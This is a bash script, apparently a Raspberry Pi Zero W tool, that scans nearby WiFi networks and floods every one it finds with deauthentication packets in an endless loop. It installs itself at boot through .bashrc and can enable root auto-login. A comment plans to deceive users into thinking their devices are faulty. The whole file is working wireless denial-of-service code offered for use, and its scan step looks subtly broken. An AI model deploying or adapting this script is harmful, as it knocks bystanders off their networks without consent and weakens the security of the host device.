#!/bin/bash

#TODO: Prevent a device from connecting to networks (aka make the user believe the device is problematic)
# aireplay-ng -0 $n -a $your_AP -c $mac $interface --ignore-negative-one

#TODO: Add a feature to target the closest WiFi in range. We'll play with PWR values in the scan file.

#this defines the attack mode, DO NOT CHANGE, it is changed internally
flag=""
#this is your interface and since we use raspi0w, nexmon utilities use the same name for monitor mode
interface="wlan0"
#we use RAM to avoid flash memory wear out
working_folder="/dev/shm"

main()
{
  start_mon

  #check if script is setup, otherwise prompt
  if [[ $1 == "haki" ]]; then
    haki
  elif [[ $1 == "closest" ]]; then
    #attack_closest
    echo "WIP"
    menu
  else
    menu
  fi
}

clean_up_junk()
{
	if [ -d ""$working_folder"/perish_dump" ]
	then
		rm -rf "$working_folder"/perish_dump
	fi
}

create_working_folder()
{
	if [ ! -d ""$working_folder"/perish_dump" ]
	then
		mkdir "$working_folder"/perish_dump
	fi
}

print_menu()
{
	echo
	echo " Startup Menu - Make modifications for startup"
	echo
	echo "   0    Uninstall any previous script"
	echo "   1    Enable auto-login"
	echo "   2    Disable auto-login"
	echo
	echo " Modes Menu - Install an attack mode at startup"
	echo
	echo "   3    Attack closest network only"
	echo "   4    Disrupt the perimeter"
	echo
	echo -n "	Choose an option : "
}

menu()
{

	#print the menu and choose your option afterwards
	print_menu

	read option
	clear
	case $option in

		0 )
			#remove startup entry
			sed -i '/\/rasperish\/rasperi.sh/d' ~/.bashrc
			#reset flag
			sed '0,/flag=/s//flag=""/' "$PWD"/$0
		;;
	
		1 )
			enable_autologin
			menu
			;;
	
		2 )
			disable_autologin
			menu
		;;
	
		3 )
			echo
			echo "		[!] Mode is work in progress. Not available."
			sleep 1
			menu
	
			#set_flag closest
			sed '0,/flag=/s//flag="closest"/' "$PWD"/$0
			#add start up entry if it doesn't exist
			if [[ $(grep -o "rasperi.sh" ~/.bashrc) != "rasperi.sh" ]]; then
				echo "./rasperish/rasperi.sh" >> ~/.bashrc
			fi
			reboot
			;;
	
		4 )
			#set_flag haki
			sed '0,/flag=/s//flag="haki"/' "$PWD"/$0
			#add start up entry if it doesn't exist
			if [[ $(grep -o "rasperi.sh" ~/.bashrc) != "rasperi.sh" ]]; then
				echo "./rasperish/rasperi.sh" >> ~/.bashrc
			fi
			reboot
			;;


		* )
			echo
			echo "		[!] Invalid option, try again"
			sleep 1
			menu
			;;
	esac
}

set_flag()
{
	sed '0,/flag=/s//flag="\$1"/' "$PWD"/$0
}

enable_autologin()
{
	sed -i "/ExecStart/c\ExecStart=-/sbin/agetty -a root --noclear %I \$TERM" /lib/systemd/system/getty@.service
}

disable_autologin()
{
	sed -i "/ExecStart/c\ExecStart=-/sbin/agetty -o '-p -- \\u' --noclear %I \$TERM" /lib/systemd/system/getty@.service
}

haki()
{

	#scan for n seconds
	scan 15

	echo "	[i] Continuously attacking these networks... "
	echo

	local i=1

	while read essid
	do
		#get each corresponding channel for every essid found
		channel=$(sed -n "${i}{p;q;}" "$working_folder"/perish_dump/channels)

		echo "	[+] Synchronising card to channel: $channel"
		#sync the card to the victim's channel
		iwconfig $interface channel $channel

		echo "	[+] Attacking $essid"
		#send some deauth packets to each wifi network
		aireplay-ng -0 5 -e $essid $interface --ignore-negative-one > /dev/null 2>&1

		((i++))
	done < "$working_folder"/perish_dump/essids

	#loop when you are done
	haki
}

stop_mon()
{
	nexutil -m0
}

start_mon()
{
	nexutil -m2
}

scan()
{
	clear

	#each time there is a scan, clean up previous ones
	clean_up_junk

	#create the working directory, where we save our scan files temporarily
	create_working_folder

	
	scan_interval=$1
	timeout -k $scan_interval airodump-ng $interface --output-format kismet --write ""$working_folder"/perish_dump/scan_data" > /dev/null 2>&1 &

	awk -F "\"*;\"*" '{print $4}' "$working_folder"/perish_dump/scan_data-01.kismet.csv | tail -n 2 > "$working_folder"/perish_dump/bssids
	awk -F "\"*;\"*" '{print $3}' "$working_folder"/perish_dump/scan_data-01.kismet.csv | tail -n 2 > "$working_folder"/perish_dump/essids
	awk -F "\"*;\"*" '{print $6}' "$working_folder"/perish_dump/scan_data-01.kismet.csv | tail -n 2 > "$working_folder"/perish_dump/channels
}

#Here starts the script and passes the flag argument to it
main $flag
